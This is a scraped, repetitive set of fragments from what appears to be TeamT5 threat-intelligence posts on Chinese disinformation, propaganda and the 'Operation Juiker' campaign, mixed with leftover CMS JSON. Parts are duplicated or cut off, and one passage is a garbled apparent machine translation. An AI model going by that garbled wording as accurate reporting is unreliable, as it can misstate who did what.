From the 2018 municipal elections to the 2020 general elections, Taiwan has witnessed the growing threat of disinformation to the citizens. It was observed that many malicious actors utilized social media to disseminate a huge amount of fake news, false information, and hate speech. These disinformation are like highly contagious viruses that will not only affect the people consuming them, but also make them secondary disseminators. We assess that:

1. Virus-like disinformation makes everyone on social media both victim and disseminator

   Although public discussion is the cornerstone of a good democratic society, many attacks have used voter enthusiasm to spread on social media. We have observed that many of the voters who participated in the discussion turned out to be the source of dissemination.
2. Disinformation continues to evolve in tactics and quantity, as well as expanding its targets

   The Taiwanese Central Election Commission (CEC) stated that the number of disinformation cases before the 2020 elections reached an unprecedented level. In addition to the evolution in quantity and tactics, we observed that the dissemination of disinformation did not stop even after the election, but instead shifted the target.
3. China continues to increase its influence

   Apart from news agency promoting the Chinese policies, inauthentic accounts run by bot, and patriotic netizens (A.K.A little pink), China has stepped up its influence on social media platforms to shape narratives.
4. Information operations are outsourced, layer-by-layer

   Before the elections, a number of marketing firms and new media were established to spread political messages. We discovered that some of them have connections with certain political parties, implying the layer-by-layer outsourcing of Information Operations by politically motivated actors.

From the perspective of security researchers, we integrated the Information Operations intercepted and investigated by TeamT5 over the past two years, hoping to contribute to the next democratic election.

If you are interested in this white paper, please fill out the form, and we will send you the report by email.

COMING UP NEXT: We will publish reports about how China conduct Information Operation on social media platforms, targeting domestic citizens and foreign audiences.

of social media has altered the way people consume information, which in turn dramatically changed the way electoral campaigns are run. From the 2018 municipal elections to the 2020 general elections, Taiwan has witnessed the growing threat of disinformation to the citizens. It was observed that many malicious actors utilized social media to disseminate a huge amount of fake news, false information, and hate speech. These disinformation are like highly contagious viruses that will not only affect the people consuming them, but also make them secondary disseminators. We assess that:</p><ol start="1"><li><div><p>Virus-like disinformation makes everyone on social media both victim and disseminator</p><p>Although public discussion is the cornerstone of a good democratic society, many attacks have used voter enthusiasm to spread on social media.

It has been confirmed that even the Chinese government-supported Advanced Persistent Threat (APT) hacking organization has been mobilized to manipulate public opinion such as disseminating fake news. APT organizations have gone beyond intelligence warfare. This is the first time that it has been confirmed that they have participated in public opinion.\n\nAccording to a report released by Taiwanese threat intelligence company TeamT5 at the recent SANS Summit, false accounts opened on social network service (SNS) platforms such as Facebook, Google (YouTube), and Twitter have been investigated at an all-time high.\n\nTeamT5 made this statement based on the number of closed accounts published on each SNS platform. Google said it had removed 186 YouTube channels that are estimated to be involved in the Chinese information war in the second quarter of last year.\n\nThe Chinese government is known to hold a pro-Chinese content and dissemination of false facts, which are known to be engaged in a defensive public opinion battle that includes state-run media and spam botnets while creating false accounts to create favorable public opinion. The number of Facebook pages used by The New York Times, CNN, and BBC pages exceeded the number of followers two years ago. As of April 2019, the number of followers on CGTN's Facebook page, the Chinese state media, was 75 million, while The New York Times, CNN, and BBC had 50 million each. \n\nIt wasn't even crazy. Targeting Taiwan, which the Chinese government observes, the APT hacking organization used \"Juiker\" to spread false information, which is a popular SNS platform used in Taiwan like KakaoTalk.\n\nTeamT5 said, \"The APT Group is an organization that focuses on espionage and information stealing, and the fact that they are mobilized in information warfare means that the Chinese government is putting all efforts into information warfare,\" and \"It is urgent,\" TeamT5 CTI analyst Che Chang warned.\n\nThe Chinese government turned out to build a system tool that monitors public opinion using Big Data and Artificial Intelligence (AI) technology, a system that can monitor not only domestic social media but also sensitive websites distributed abroad.\n\nTeamT5 is a security company founded by APT experts.

From the 2019 Hong Kong Protest to the 2020 COVID-19 pandemic, China has demonstrated the art of surveillance, censorship, and most importantly, digital propaganda.\n\nIn this white paper, we focus on China's digital propaganda inside the Great Firewall. We suggest that the regime has developed a unique, organizational, and sophisticated propaganda mechanism, which we dub as \"digital propaganda formula.\" With this formula, the Chinese Communist Party (CCP) has managed to transform all the Chinese social media platforms inside the Great Firewall into an almost total pro-CCP environment.\n\n#### Key Takeaways\n\n1. CCP has strengthened its control over Chinese cyberspace by establishing legislations as well as centralizing administrations, and the \"last mile\" of its cyber governance is to control public opinion through censorship and digital propaganda.\n\n2. We dub China's sophisticated propaganda mechanism the \"digital propaganda formula,\" which consists of state media, communist youth league, governmental affairs new media, as well as trolling factory.\n\n3. Moreover, CCP's policies have bolstered the industry of \"public opinion guidance\" in China. The industry practitioners have developed AI and big data-powered systems to help the government to collect, store, and analyze public sentiment.\n\n4. China's formula has polluted the online information environment inside the Great Firewall. We assess that the CCP is trying to project its digital propaganda dominance to foreign social media platforms in order to control the world's discourse power. \n\nFollowing the global pandemic, the world relies on the internet more than ever.

From the 2018 municipal elections to the 2020 general elections, Taiwan has witnessed the growing threat of disinformation to the citizens. It was observed that many malicious actors utilized social media to disseminate a huge amount of fake news, false information, and hate speech. These disinformation are like highly contagious viruses that will not only affect the people consuming them, but also make them secondary disseminators. We assess that:\n\n1. Virus-like disinformation makes everyone on social media both victim and disseminator\n\n   Although public discussion is the cornerstone of a good democratic society, many attacks have used voter enthusiasm to spread on social media. We have observed that many of the voters who participated in the discussion turned out to be the source of dissemination.\n2. Disinformation continues to evolve in tactics and quantity, as well as expanding its targets\n\n   The Taiwanese Central Election Commission (CEC) stated that the number of disinformation cases before the 2020 elections reached an unprecedented level. In addition to the evolution in quantity and tactics, we observed that the dissemination of disinformation did not stop even after the election, but instead shifted the target.\n3. China continues to increase its influence\n\n   Apart from news agency promoting the Chinese policies, inauthentic accounts run by bot, and patriotic netizens (A.K.A little pink), China has stepped up its influence on social media platforms to shape narratives.\n4. Information operations are outsourced, layer-by-layer\n\n   Before the elections, a number of marketing firms and new media were established to spread political messages. We discovered that some of them have connections with certain political parties, implying the layer-by-layer outsourcing of Information Operations by politically motivated actors.\n\nFrom the perspective of security researchers, we integrated the Information Operations intercepted and investigated by TeamT5 over the past two years, hoping to contribute to the next democratic election.\n\nIf you are interested in this white paper, please fill out the form, and we will send you the report by email.\n\nCOMING UP NEXT: We will publish reports about how China conduct Information Operation on social media platforms, targeting domestic citizens and foreign audiences.

To assess the full version of the analysis, please subscribe our report \"Cyber Affairs Biweekly-Update.\"*\n\n### Key Takeaways\n\n1. China has exerted ever greater influence over the globe since the outbreak of the coronavirus. Over the past three months, TeamT5 has been monitoring how China utilizes its cyber strength and propaganda machine to handle the Covid-19 pandemic.\n2. The Chinese authorities have collaborated with telecom firms and tech giants in China, using technologies such as big data to control the public opinion and people's movement. The regime has implemented measures such as digital surveillance, keywords censorship on social media applications, and Health Code System.\n3. Moreover, China has also exercised its propaganda machine to shape both domestic and international narrative of the pandemic. The Chinese officials and Chinese state media have utilized various social media platforms, particularly Weibo and Twitter, to disseminate propaganda to Chinese people and foreign audiences. Some Chinese officials have connived and even promoted online conspiracy theory, which claimed China is not the origin of the coronavirus.\n\n### Blurred Lines Between State and Corps: Telecom Surveillance and Health Code System\n\nThe Chinese Communist Party (CCP) has collaborated with its national tech giants and telecom firms to implement a series of security measures in the name of containing the coronavirus outbreak.\n\nThe regime has elevated its digital control over domestic citizens. In mid-February, China's Ministry of Industry and Information Technology (MIIT) sent a notice to Information and Communications Technology (ICT) service providers, demanding relevant firms to strengthen monitoring and censorship over online public discussion.\\[1\\] The MIIT also announced the utilization of telecom big data analysis in support of the battle against the coronavirus. \\[2\\]\n\nAs the country tried to resume normal operations, the Chinese authorities launched Health Code System, using big data to monitor citizens' health status and then regulate their movement. The Health Code System is developed by the Ant Financial, an affiliate company of the Chinese Alibaba Group, and Tencent in collaboration with the Chinese authorities.\n\nThe system has raised privacy concerns since it connects and integrates databases of government units and private firms, forming a comprehensive surveillance system which contains real name, phone number, ID, address, travel history, health status and contact history. Moreover, only 3 out of 16 Health Code Apps list their user agreement and privacy policy at installation, while others will directly direct users to the registration page to fill out personal information.\\[3\\] This shows that most of the users' data are collected, processed, and shared without informed consent.\n\n### Strategic Distraction and Positive Propaganda Targeting Domestic Citizens\n\nThe authoritarian regime is also in another battle to shape the public opinion about the epidemic. Initially, the Chinese state media employed strategic distraction to mitigate the seriousness of the coronavirus. Before Wuhan Lockdown on January 23, Chinese state media started reporting the Influenza B in the United States.\\[4\\] The topic \"Influenza B outbreak in the US\" (美国爆发乙型流感) reached 500 million views and 31,000 discussions on Weibo.\\[5\\]\n\n![](https://res.cloudinary.com/dvgomg5gh/image/upload/v1590718735/SR_1_4fb4158a6a.png)_Figure 1: News report by the China Central Television (CCTV)._\n\nAs the number confirmed cases soared in China, the Chinese state media outlets started to spread positive propaganda. For instance, they highly praised the Chinese authorities' handling of the virus by highlighting the rapid construction of Huoshenshan Hospital.\\[6\\] They also promoted narratives such as \"the Chinese people are sacrificing to fight the virus\", accompanied by praises from WHO Director General Tedros Adhanom Ghebreyesus.\\[7\\]\\[8\\]\n\n![](https://res.cloudinary.com/dvgomg5gh/image/upload/v1590718736/SR_2_0b7b7f6542.png)_Figure 2: YouTube video by China Global Television Network (CGTN)._\n\nThe regime has seized the opportunity to demonstrate the country's strength to contain the virus as well as the advantages of an authoritarian regime. The CCP uses the case to show that its authoritarian governance system is more effective than the liberal democracies when facing a crisis like the Covid-19 pandemic.\n\n### Propaganda, Hoaxes and Conspiracy Theories: From Troublemaker to Global Savior\n\nAlthough China was widely criticized for its delayed and opaque treatment to the coronavirus outbreak during the initial stage, the regime has backed on its feet to polish its international image after the pandemic seems to have subsided in China.\n\nIn particular, Italy, the first G-7 country to join China's Belt and Road Initiative (BRI), became a favorable environment for the regime to launch propaganda. We observed a series of propaganda was launched against Italy.\n\n![](https://res.cloudinary.com/dvgomg5gh/image/upload/v1590718735/SR_3_c2c0ee47d2.png)_Figure 3: The Chinese embassy posted a series of tweets to promote China's medical aids foe Italy, using hashtag #ForzaCinaeItalia_\n\nThe campaign is revealed to have boosted by social manipulation, as the hashtag #ForzaCinaeItalia (Go China, go Italy) was promoted by Twitter bot accounts.\\[9\\]\n\nIn another case, since March 15, Chinese state media outlets as well as Chinese diplomats Hua Chunying and Zhao Lijian have promoted a video of Italian chanting \"Grazie, Cina!\" on their balconies with the Chinese anthem \"March of the Volunteers\" playing.\\[10\\] The video was examined by researchers and was claimed to be manufactured.\n\n![](https://res.cloudinary.com/dvgomg5gh/image/upload/v1590718737/SR_4_b4d7e95934.png)_Figure 4: Hua Chunying's sharing the video on Twitter._\n\n### \"Origin\" Propaganda: Conspiracy Theories of Patient Zero\n\nConspiracy theories of the origin of the coronavirus have emerged across social media platforms as early as January. One of the significant cases is a conspiracy theory claiming that the US military had brought the coronavirus to Wuhan during the 2019 Military World Games.\n\nStarting from March 12, 2020, Zhao Lijian, a deputy director of the Chinese Foreign Ministry's Information Department, has posted a series of tweet to amplify the conspiracy theory on Twitter. In one of his tweets, he shared a video clip of US Centers for Disease Control (CDC) chief Robert Redfield saying some Covid-19 death might have been diagnosed as influenza in the US, using it as evidence that the virus originated in the US.\\[11\\]\n\n![](https://res.cloudinary.com/dvgomg5gh/image/upload/v1590718735/SR_5_2802d4b539.png)_Figure 5: A series of tweets by Zhao Lijian promoting the conspiracy theory, along with articles of \"globalresearch.ca\". The website often promotes anti-US conspiracy theory._\n\n![](https://res.cloudinary.com/dvgomg5gh/image/upload/v1590718735/SR_6_2bb97447e7.png)_Figure 6: Global Times reporting the conspiracy theory about US military personnel bringing COVID-19 to China._\n\nBesides the US, Italy is also one of the scapegoats for China's coronavirus origin propaganda. Starting from March 22, multiple Chinese state media outlets have published news article titled \"Coronavirus may have existed in Italy since November: local researcher,\" implying that Italy was the origin of Coronavirus.\\[12\\]\\[13\\] They cited the words of the Italian physician Giuseppe Remuzzi in an interview with NPR on March 19 \\[14\\], using it as statement to prove that China is not the origin of the coronavirus.\n\nAlthough Remuzzi protested that his words were twisted by China, the narrative has already gone viral.\\[15\\] The CCTV created a topic \"Expert claims the coronavirus may have existed in Italy since November\" (专家称疫情去年11月或已在意大利流行), which reached approximately 500 million views and 35,000 discussion posts.\n\n### Conclusion\n\nChina's cyber strength and digital influence did not scale down even in the times of the pandemic. Instead, the regime took the opportunity to pose itself as a global leader more capable than the US. We can see that the CCP has well mastered its cyber capabilities and propaganda machine, expanding the regime's control from physical entities to public opinion. Moreover, the CCP has elevated its efforts to shape international opinion through the Twitter platform. We assess that the CCP will have more power of discourse and influence after they learned to conduct propaganda campaign on foreign social media platforms, and every party should be vigilant about it.\n\n### Reference\n\n\\[1\\] 工业和信息化部办公厅关于做好疫情防控期间信息通信行业网络安全保障工作的通知 (MIIT's Notice on Cybersecurity Practice for Information and Communications Technology (ICT) Service Providers During Epidemic Control)  \nhttp://www.miit.gov.cn/n1146290/n1146402/c7681785/content.html\n\n\\[2\\] 工业和信息化部召开媒体通气会 介绍电信大数据分析、支撑服务疫情防控总体情况 (MIIT's Media Briefing on the Utilization of Telecom Big Data Analysis on Epidemic Control)  \nhttp://www.miit.gov.cn/n1146290/n1146402/c7678438/content.html\n\n\\[3\\] 健康码的隐私政策还有哪些改进空间？(Room of Improvement on the Health Code System's Privacy Policy)  \nhttps://www.jiemian.com/article/4120372.html\n\n\\[4\\] 美国暴发40年来最致命流感 已有6600人死亡 (US' Worst Influenza Outbreak in 40 Years, 6600 Americans Killed)  \nhttp://news.sina.com.cn/w/2020-01-22/doc-iihnzhha4088647.shtml\n\n\\[5\\] https://s.weibo.com/weibo?q=%23美国爆发乙型流感%23\u0026Refer=SWeibo_box\n\n\\[6\\] CGTN: Time lapse video: Construction of Wuhan Huoshenshan Hospital completed  \nhttps://www.youtube.com/watch?v=53nhErXUd9A\n\n\\[7\\] 中国人民\"正在为全人类作贡献\" (Chinese People are Contributing for All Human Kind)  \nhttp://world.people.com.cn/n1/2020/0308/c1002-31622166.html\n\n\\[8\\] Xinhua Net: China deserves appreciation for efforts, sacrifices in fighting epidemic: WHO chief  \nhttp://www.xinhuanet.com/english/2020-02/16/c_138789289.htm\n\n\\[9\\] How China unleashed Twitter bots to spread COVID-19 propaganda in Italy  \nhttps://formiche.net/2020/03/china-unleashed-twitter-bots-covid19-propaganda-italy/\n\n\\[10\\] https://twitter.com/SpokespersonCHN/status/1239041044580188162  \nhttps://twitter.com/zlj517/status/1239112822908276736  \nCGTN: Italians play Chinese national anthem to thank China for its aid  \nhttps://www.youtube.com/watch?v=8ZKsA2jbwlk  \nCCTV: Italians play Chinese national anthem, chanting \"Grazie Cina\"  \nhttps://www.facebook.com/watch/?v=201784281098386\n\n\\[11\\] https://twitter.com/zlj517/status/1238111898828066823\n\n\\[12\\] Coronavirus may have existed in Italy since November: local researcher  \nhttps://news.cgtn.com/news/2020-03-22/Coronavirus-may-have-existed-in-Italy-since-November-local-researcher-P4i2As2OAg/index.html\n\n\\[13\\] Italian doctors saw strange pneumonia cases before China's COVID-19 outbreak, report says   \nhttp://www.china.org.cn/world/Off_the_Wire/2020-03/22/content_75845579.htm\n\n\\[14\\] 'Every Single Individual Must Stay Home': Italy's Coronavirus Surge Strains Hospitals  \nhttps://www.npr.org/2020/03/19/817974987/every-single-individual-must-stay-home-italy-s-coronavirus-deaths-pass-china-s?t=1585131614833\n\n\\[15\\] Beijing twisted my words on coronavirus's Italian origin, says scientist Giuseppe Remuzzi  \nhttps://www.thetimes.co.uk/article/beijing-twisted-my-words-on-coronaviruss-italian-origin-says-scientist-giuseppe-remuzzi-6twwhkrvn","createdAt":"2020-05-24T17:56:37.931Z","updatedAt":"2020-07-02T09:41:31.546Z","__v":0,"id":"5ecab555602fc90040476054"}],"createdAt":"2020-05-24T17:56:37.926Z","updatedAt":"2021-01-08T06:55:16.343Z","__v":1,"topic":"5ecaa02ba792d70040a0d8b3","author":"5eeae9e3163518003f86d917","publish_date":"2020-04-21T02:00:00.000Z","id":"5ecab555602fc90040476053"},{"publish":true,"enable_form":true,"tags":["5f0e5b52163518003f86d983","5f0e6732163518003f86d9aa","5f0e6743163518003f86d9ab","5ecf6ceefedd7f004b26974a","5f0e6315163518003f86d9a9"],"relative_posts":["5ecab44c602fc90040476047","602e177fc56e80003f985a0e","5f866d3ada3440005757a928"],"_id":"5f0e5aad163518003f86d97e","post_url":"teamt5-information-operation-white-paper-china-s-digital-propaganda-formula-inside-the-great-firewall","post_name":"TeamT5 Information Operation White Paper (Part 2 of 3): China’s Digital Propaganda Formula inside the Great Firewall","banner_img_url":"https://res.cloudinary.com/dvgomg5gh/image/upload/v1594807939/1920_1280_1920-1280_%E8%A4%87%E6%9C%AC_3_4730f822ca.jpg","contents":[{"locale":"en","_id":"5f0e5aae163518003f86d97f","title":"TeamT5 Information Operation White Paper (Part 2 of 3): China’s Digital Propaganda Formula inside the Great Firewall","context":"To confront the emerging threat of China's Information Operation, TeamT5 threat intelligence team publishes this White Paper covering how China conduct information manipulation across Chinese social media platforms. From the 2019 Hong Kong Protest to the 2020 COVID-19 pandemic, China has demonstrated the art of surveillance, censorship, and most importantly, digital propaganda.\n\nIn this white paper, we focus on China's digital propaganda inside the Great Firewall. We suggest that the regime has developed a unique, organizational, and sophisticated propaganda mechanism, which we dub as \"digital propaganda formula.\" With this formula, the Chinese Communist Party (CCP) has managed to transform all the Chinese social media platforms inside the Great Firewall into an almost total pro-CCP environment.\n\n#### Key Takeaways\n\n1. CCP has strengthened its control over Chinese cyberspace by establishing legislations as well as centralizing administrations, and the \"last mile\" of its cyber governance is to control public opinion through censorship and digital propaganda.\n\n2. We dub China's sophisticated propaganda mechanism the \"digital propaganda formula,\" which consists of state media, communist youth league, governmental affairs new media, as well as trolling factory.\n\n3. Moreover, CCP's policies have bolstered the industry of \"public opinion guidance\" in China. The industry practitioners have developed AI and big data-powered systems to help the government to collect, store, and analyze public sentiment.\n\n4. China's formula has polluted the online information environment inside the Great Firewall. We assess that the CCP is trying to project its digital propaganda dominance to foreign social media platforms in order to control the world's discourse power. \n\nFollowing the global pandemic, the world relies on the internet more than ever. Cyber threat actors and influence operators, either state-backed or money driven, are taking the advantage to conduct information operation.

The first part of the report displays a brief overview of its overt operations which are carried out by state media, embassies, and diplomats. Then we look into the covert operations, which can be observed in pro-China fan pages, content farms, and spam botnet. Last but not least, we provide the case study of \"Operation Juiker\" on Taiwan's largest forum PTT, which suggests the possibility of the APT (Advanced Persistent Threat) actors entering the threat landscape.\n\n#### Key Takeaways\n\n1. China has escalated the level of overt InfoOps via state-media and diplomats.\n\u003cbr\u003e\n\u003cbr\u003e\nChinese state media, diplomats, and embassies are the main actors of Chinese overt InfoOps. They shoulder the task to polish the image of the regime and propagate the narrative of the Chinese Communist Party (CCP). It is noteworthy that their official accounts have obtained an unexpected number of followers in recent years. For instance, four Chinese state media are included in the top 20 most-followed pages on Facebook. Their main audience, apart from the Chinese citizens, are overseas Chinese diaspora, which many of them have rights to vote in countries such as the U.S., Canada, and Australia, thus having the ability to influence a country's politics.\n\u003cbr\u003e\n\u003cbr\u003e\n2. Covert InfoOps remain active on Western social media platforms.\n\u003cbr\u003e\n\u003cbr\u003e\n2020 is a year which has set many records. This year, the takedowns of covert Chinese social media accounts by Facebook, Twitter, and Google are more frequent than ever. However, even with such efforts, we observed that there are new covert actors emerging across the platforms, while the banned actors keep coming back to the scene by registering new domains and new accounts. We spotted that there is a huge number of Facebook pages with admins located in China dedicated to disseminating Chinese propaganda content originated from Chinese social media platform, Weibo. Besides, there are sophisticated actors that create websites and subtle content to help the Chinese government shaping the narrative for the Hong Kong protest. We also detected numerous networks of pro-China political accounts that demonstrated strong signs of automated behavior.\n\u003cbr\u003e\n \u003cbr\u003e\n3. APT actors might have entered the InfoOps threat landscape.\n\u003cbr\u003e\n\u003cbr\u003e\nThe situation is become more alarming as we discovered that the Advanced Persistent Threat (APT) actors might have entered the InfoOps threat landscape. APT actors, typically a state-sponsored group, usually conduct prolonged and targeted cyberattacks to mine highly sensitive data. However, in mid-2020, we identified an InfoOp that can be linked to a notorious Chinese APT group which TeamT5 intelligence team has tracked for years. We discovered that the threat actors had disseminated disinformation about \"Juiker,\" a messaging app developed by Taiwan's research institute and widely used by government units, on Taiwan's largest forum PTT. The operation, which we dub as \"Operation Juiker,\" aimed to discredit Taiwan's intelligence agency and government-backed research institute by spreading disinformation of the messaging app being hacked.\n\u003cbr\u003e\n\u003cbr\u003e\n4.  It is more crucial than ever to adopt threat intelligence solutions to combat the issue.\n\u003cbr\u003e\n\u003cbr\u003e\nThe abovementioned Operation Juiker has well demonstrated the possibility of \"APT + InfoOp\" attack model, which involves targeted social media campaigns disseminating disinformation based on highly confidential data. Such situation is super tricky, and it could pose a great threat to democratic countries.

It has been confirmed that even the Chinese government-supported Advanced Persistent Threat (APT) hacking organization has been mobilized to manipulate public opinion such as disseminating fake news. APT organizations have gone beyond intelligence warfare. This is the first time that it has been confirmed that they have participated in public opinion.\n\nAccording to a report released by Taiwanese threat intelligence company TeamT5 at the recent SANS Summit, false accounts opened on social network service (SNS) platforms such as Facebook, Google (YouTube), and Twitter have been investigated at an all-time high.\n\nTeamT5 made this statement based on the number of closed accounts published on each SNS platform. Google said it had removed 186 YouTube channels that are estimated to be involved in the Chinese information war in the second quarter of last year.\n\nThe Chinese government is known to hold a pro-Chinese content and dissemination of false facts, which are known to be engaged in a defensive public opinion battle that includes state-run media and spam botnets while creating false accounts to create favorable public opinion. The number of Facebook pages used by The New York Times, CNN, and BBC pages exceeded the number of followers two years ago. As of April 2019, the number of followers on CGTN's Facebook page, the Chinese state media, was 75 million, while The New York Times, CNN, and BBC had 50 million each. \n\nIt wasn't even crazy. Targeting Taiwan, which the Chinese government observes, the APT hacking organization used \"Juiker\" to spread false information, which is a popular SNS platform used in Taiwan like KakaoTalk.\n\nTeamT5 said, \"The APT Group is an organization that focuses on espionage and information stealing, and the fact that they are mobilized in information warfare means that the Chinese government is putting all efforts into information warfare,\" and \"It is urgent,\" TeamT5 CTI analyst Che Chang warned.\n\nThe Chinese government turned out to build a system tool that monitors public opinion using Big Data and Artificial Intelligence (AI) technology, a system that can monitor not only domestic social media but also sensitive websites distributed abroad.\n\nTeamT5 is a security company founded by APT experts. It tracks and monitors versions between the Chinese government and supplies threat intelligence to Asia-Pacific regions such as Taiwan and Japan.\n\n[Read more](https://www.etnews.com/20210215000176)\n\n\u003cbr\u003e\n","__v":0,"id":"602e1c9fc56e80003f985a11"}],"createdAt":"2021-02-18T07:30:07.989Z","updatedAt":"2021-06-02T05:41:47.631Z","__v":0,"publish_date":"2021-02-15T04:00:00.000Z","author":"5eec3483163518003f86d943","banner_img_url":"https://res.cloudinary.com/dvgomg5gh/image/upload/f_auto/v1613634738/SANS_1_a4937cc174.png","topic":"5ecaa036a792d70040a0d8b4","id":"602e177fc56e80003f985a0e"}],"id":"5ecf6ceefedd7f004b26974a"},{"_id":"5f0e6315163518003f86d9a9","name":"social media","createdAt":"2020-07-15T01:59:49.787Z","updatedAt":"2020-10-14T03:40:54.601Z","__v":0,"posts":[{"publish":true,"enable_form":true,"tags":["5f0e5b52163518003f86d983","5f0e6732163518003f86d9aa","5f0e6743163518003f86d9ab","5ecf6ceefedd7f004b26974a","5f0e6315163518003f86d9a9"],"relative_posts":["5ecab44c602fc90040476047","602e177fc56e80003f985a0e","5f866d3ada3440005757a928"],"_id":"5f0e5aad163518003f86d97e","post_url":"teamt5-information-operation-white-paper-china-s-digital-propaganda-formula-inside-the-great-firewall","post_name":"TeamT5 Information Operation White Paper (Part 2 of 3): China’s Digital Propaganda Formula inside the Great Firewall","banner_img_url":"https://res.cloudinary.com/dvgomg5gh/image/upload/v1594807939/1920_1280_1920-1280_%E8%A4%87%E6%9C%AC_3_4730f822ca.jpg","contents":[{"locale":"en","_id":"5f0e5aae163518003f86d97f","title":"TeamT5 Information Operation White Paper (Part 2 of 3): China’s Digital Propaganda Formula inside the Great Firewall","context":"To confront the emerging threat of China's Information Operation, TeamT5 threat intelligence team publishes this White Paper covering how China conduct information manipulation across Chinese social media platforms. From the 2019 Hong Kong Protest to the 2020 COVID-19 pandemic, China has demonstrated the art of surveillance, censorship, and most importantly, digital propaganda.\n\nIn this white paper, we focus on China's digital propaganda inside the Great Firewall. We suggest that the regime has developed a unique, organizational, and sophisticated propaganda mechanism, which we dub as \"digital propaganda formula.\" With this formula, the Chinese Communist Party (CCP) has managed to transform all the Chinese social media platforms inside the Great Firewall into an almost total pro-CCP environment.\n\n#### Key Takeaways\n\n1. CCP has strengthened its control over Chinese cyberspace by establishing legislations as well as centralizing administrations, and the \"last mile\" of its cyber governance is to control public opinion through censorship and digital propaganda.\n\n2. We dub China's sophisticated propaganda mechanism the \"digital propaganda formula,\" which consists of state media, communist youth league, governmental affairs new media, as well as trolling factory.\n\n3. Moreover, CCP's policies have bolstered the industry of \"public opinion guidance\" in China. The industry practitioners have developed AI and big data-powered systems to help the government to collect, store, and analyze public sentiment.\n\n4. China's formula has polluted the online information environment inside the Great Firewall. We assess that the CCP is trying to project its digital propaganda dominance to foreign social media platforms in order to control the world's discourse power. \n\nFollowing the global pandemic, the world relies on the internet more than ever. Cyber threat actors and influence operators, either state-backed or money driven, are taking the advantage to conduct information operation.

The first part of the report displays a brief overview of its overt operations which are carried out by state media, embassies, and diplomats. Then we look into the covert operations, which can be observed in pro-China fan pages, content farms, and spam botnet. Last but not least, we provide the case study of \"Operation Juiker\" on Taiwan's largest forum PTT, which suggests the possibility of the APT (Advanced Persistent Threat) actors entering the threat landscape.\n\n#### Key Takeaways\n\n1.

They shoulder the task to polish the image of the regime and propagate the narrative of the Chinese Communist Party (CCP). It is noteworthy that their official accounts have obtained an unexpected number of followers in recent years. For instance, four Chinese state media are included in the top 20 most-followed pages on Facebook. Their main audience, apart from the Chinese citizens, are overseas Chinese diaspora, which many of them have rights to vote in countries such as the U.S., Canada, and Australia, thus having the ability to influence a country's politics.\n\u003cbr\u003e\n\u003cbr\u003e\n2.

This year, the takedowns of covert Chinese social media accounts by Facebook, Twitter, and Google are more frequent than ever. However, even with such efforts, we observed that there are new covert actors emerging across the platforms, while the banned actors keep coming back to the scene by registering new domains and new accounts. We spotted that there is a huge number of Facebook pages with admins located in China dedicated to disseminating Chinese propaganda content originated from Chinese social media platform, Weibo. Besides, there are sophisticated actors that create websites and subtle content to help the Chinese government shaping the narrative for the Hong Kong protest. We also detected numerous networks of pro-China political accounts that demonstrated strong signs of automated behavior.\n\u003cbr\u003e\n \u003cbr\u003e\n3.

APT actors, typically a state-sponsored group, usually conduct prolonged and targeted cyberattacks to mine highly sensitive data. However, in mid-2020, we identified an InfoOp that can be linked to a notorious Chinese APT group which TeamT5 intelligence team has tracked for years. We discovered that the threat actors had disseminated disinformation about \"Juiker,\" a messaging app developed by Taiwan's research institute and widely used by government units, on Taiwan's largest forum PTT. The operation, which we dub as \"Operation Juiker,\" aimed to discredit Taiwan's intelligence agency and government-backed research institute by spreading disinformation of the messaging app being hacked.\n\u003cbr\u003e\n\u003cbr\u003e\n4.  It is more crucial than ever to adopt threat intelligence solutions to combat the issue.\n\u003cbr\u003e\n\u003cbr\u003e\nThe abovementioned Operation Juiker has well demonstrated the possibility of \"APT + InfoOp\" attack model, which involves targeted social media campaigns disseminating disinformation based on highly confidential data. Such situation is super tricky, and it could pose a great threat to democratic countries. In this case, threat intelligence can help provide instant analysis of actor methodologies, suspicious indicators, and potential risks.

APT 攻擊者很可能參與了社群媒體上的資訊戰\n\u003cbr\u003e\n\u003cbr\u003e\n我們擔心 APT 攻擊者很可能參與了社群媒體上的資訊戰。APT 通常是由一個國家所支持的駭客團體，以竊取機敏資料為主，APT 的攻擊者往往具備了強悍的網路攻擊手法與資源。然而，我們今年偵察到了一個可能是由 APT 攻擊者發動的假新聞攻擊。該事件發生在 2020 年七月，PTT 論壇八卦版上，開始有許多被盜用的帳號以假新聞攻擊台灣重要軍事單位，造謠台灣公務機關使用的 Juiker 通訊軟體遭駭，以及台灣重要軍事機關遭駭。我們透過搜索比對貼文與發文 IP，發現其中一個 IP 位址，符合某個中國 APT 曾經使用過的中繼站。\n\u003cbr\u003e\n\u003cbr\u003e\n4. 威脅情資作為對抗資訊戰的重要環節\n\u003cbr\u003e\n\u003cbr\u003e\n如同前述的分析脈絡，APT 與社群操弄的結合會讓防守方更加棘手。在棘手的防守環境中，唯有威脅情資（threat intelligence）可以提供即時的分析，評估攻擊者的攻擊手法、可疑的指標、以及造成的風險。而在快速更迭的社群媒體環境中，平台方與事實查核團體非常難找到證據，歸因大量散播的假新聞。我們認為唯有導入威脅情資，才能有效幫助政府單位、重要關鍵基礎設施與企業，對抗資訊戰。\n\u003cbr\u003e\n\u003cbr\u003e\n\n若您對我們的白皮書有興趣，請填寫以下表單，取得完整的研究報告。\n\u003cbr\u003e\n\u003cbr\u003e\n追蹤 TeamT5 [Twitter](https://twitter.com/TeamT5_Official)，資安動態不漏接！\n\u003cbr\u003e","createdAt":"2020-10-14T07:24:40.028Z","updatedAt":"2020-12-04T03:23:18.109Z","__v":0,"id":"5f86a7b8da3440005757a941"}],"createdAt":"2020-10-14T03:15:06.772Z","updatedAt":"2021-06-02T05:41:47.633Z","__v":1,"author":"5eeae9e3163518003f86d917","topic":"5ecaa02ba792d70040a0d8b3","banner_img_url":"https://res.cloudinary.com/dvgomg5gh/image/upload/f_auto/v1602486856/2020%E7%99%BD%E7%9A%AE%E6%9B%B8V3%E5%AE%A3%E5%82%B3%E5%9C%96_blog_1920x1280_26f322ea32.jpg","attachment_id":"1IiFL4iEBKoOwQkSbmwVsQMXWOLV4r9pN","id":"5f866d3ada3440005757a928"}],"id":"5f0e6315163518003f86d9a9"}],"relative_posts":["5ecab44c602fc90040476047","602e177fc56e80003f985a0e","5f866d3ada3440005757a928"],"_id":"5f0e5aad163518003f86d97e","post_url":"teamt5-information-operation-white-paper-china-s-digital-propaganda-formula-inside-the-great-firewall","post_name":"TeamT5 Information Operation White Paper (Part 2 of 3): China’s Digital Propaganda Formula inside the Great 